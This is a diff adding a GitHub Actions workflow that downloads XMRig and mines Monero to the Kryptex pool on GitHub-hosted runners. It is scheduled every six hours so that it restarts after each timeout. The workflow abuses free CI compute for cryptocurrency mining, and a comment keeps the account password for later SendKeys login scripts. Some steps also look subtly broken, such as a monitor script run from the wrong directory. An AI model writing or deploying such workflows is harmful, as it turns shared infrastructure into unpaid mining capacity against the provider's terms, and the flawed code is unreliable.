@@ -1,0 +1,71 @@
+name: Enhanced Kryptex Pool Mining
+
+on:
+  schedule:
+    - cron: '5 */6 * * *'  # Every 6 hours with 5-min offset for auto-restart post-timeout
+  workflow_dispatch:  # Manual trigger
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # Enforces 6-hour run; GitHub cancels ~6h5m max
+
+    steps:
+      - name: Checkout repo (for potential scripts)
+        uses: actions/checkout@v4
+
+      - name: Update system and install dependencies
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install -y wget tar build-essential libssl-dev libhwloc-dev curl
+
+      - name: Download latest XMRig
+        run: |
+          # Fetch latest release tag for stability
+          LATEST_TAG=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep tag_name | cut -d '"' -f4)
+          wget https://github.com/xmrig/xmrig/releases/download/$LATEST_TAG/xmrig-$LATEST_TAG-linux-static-x64.tar.gz
+          tar -xzf xmrig-*.tar.gz
+          cd xmrig-*
+          echo "Using XMRig version: $LATEST_TAG"
+
+      - name: Health check setup
+        run: |
+          # Simple bash script to log periodic stats (runs in background)
+          cat > monitor.sh << 'EOF'
+          #!/bin/bash
+          while true; do
+            echo "$(date): Uptime check - Mining active"
+            sleep 300  # Log every 5 mins
+          done
+          EOF
+          chmod +x monitor.sh
+
+      - name: Start Kryptex XMR Mining with Monitoring
+        run: |
+          cd xmrig-*
+          # Background monitor
+          ./monitor.sh &
+          # Enhanced config: Kryptex XMR pool, email auth, 80% threads, low donation, verbose logs, retry on fail
+          ./xmrig \
+            -o xmr.kryptex.network:7029 \
+            -u ${{ secrets.KRYPTEX_EMAIL }}.github-actions-worker \
+            -p x \
+            --cpu-max-threads-hint=80 \
+            --donate-level=1 \
+            --print-time=60 \
+            --log-file=xmrig.log \
+            --retries=3 \
+            --retry-pause=5 \
+            --user-agent="GitHubActionsMiner/1.0" \
+            --verbose
+        env:
+          # Password secret available for future app login scripts (e.g., PowerShell SendKeys)
+          KRYPTEX_PASSWORD: ${{ secrets.KRYPTEX_PASSWORD }}
+
+      - name: Post-run summary (if job ends early)
+        if: always()
+        run: |
+          if [ -f xmrig.log ]; then
+            echo "Final log excerpt:"
+            tail -20 xmrig.log
+          fi
